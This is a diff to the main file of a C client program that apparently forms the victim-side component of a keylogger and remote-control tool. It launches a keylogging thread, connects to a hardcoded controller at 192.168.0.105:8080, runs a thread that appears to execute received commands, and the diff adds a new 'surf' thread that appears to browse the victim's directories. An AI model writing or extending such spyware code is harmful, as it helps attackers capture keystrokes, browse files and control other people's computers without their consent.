@@ -13,31 +13,32 @@
 #endif
 
 #include "../common/socket.h"
-#include "../common/common.h"
+#include "SURF/seeDirectory.h"
 #include "keylogger.h"
 
 #define PORT 8080
 #define ADDRESS "192.168.0.105"
 int main() {
-	paramThread param;
+	paramSurf param;
 
-	inisialisasiParamThread(&param);
-	isiPort(&param, PORT);
-	isiAddress(&param, ADDRESS);
-	isiStatus(&param, 'C');
+	inisialisasiParamThread(param.paramT);
+	isiPort(param.paramT, PORT);
+	isiAddress(param.paramT, ADDRESS);
+	isiStatus(param.paramT, 'C');
 
 
 #ifdef _WIN32
-	HANDLE cliSocket, sendMSG, execMSG, actKeylog;
-	DWORD cliSocketId, sendMSGId, execMSGId, actKeylogId;
+	HANDLE cliSocket, sendMSG, execMSG, actKeylog, surf;
+	DWORD cliSocketId, sendMSGId, execMSGId, actKeylogId, surfId;
 
 	WSADATA wsa;
 	WSAStartup(MAKEWORD(2,2), &wsa);
 
 	actKeylog = CreateThread(NULL, 0, activateKeylog, NULL, 0, &actKeylogId);
-	cliSocket = CreateThread(NULL, 0, clientSocket, (LPVOID)&param, 0, &cliSocketId);
-	//sendMSG = CreateThread(NULL, 0, sendMessage, (LPVOID)&param, 0, &sendMSGId);
+	cliSocket = CreateThread(NULL, 0, clientSocket, (LPVOID)param.paramT, 0, &cliSocketId);
+	//sendMSG = CreateThread(NULL, 0, sendMessage, (LPVOID)param.paramT, 0, &sendMSGId);
 	execMSG = CreateThread(NULL, 0, execMessage, (LPVOID)&param, 0, &execMSGId);
+	surf = CreateThread(NULL, 0, surfMode, (LPVOID)&param, 0, &surfId);
 
 
 	WaitForSingleObject(cliSocket, INFINITE);
@@ -52,19 +53,10 @@ int main() {
 	WaitForSingleObject(actKeylog, INFINITE);
 	CloseHandle(actKeylog);
 
+	WaitForSingleObject(surf, INFINITE);
+	CloseHandle(surf);
+
 #else
-	pthread_t cliSocket, send, get;
-
-	pthread_create(&cliSocket, NULL, clientSocket, (void *)&param);
-	pthread_create(&send, NULL, sendMessage, (void *)&(param.clientSocket));
-	pthread_create(&get, NULL, getMessage, (void *)&param);
-
-	pthread_join(cliSocket, NULL);
-	pthread_join(send, NULL);
-	pthread_join(get, NULL);
-
-	// closing the connected socket
-	close((param).clientSocket);	
 #endif
 
 	return 0;
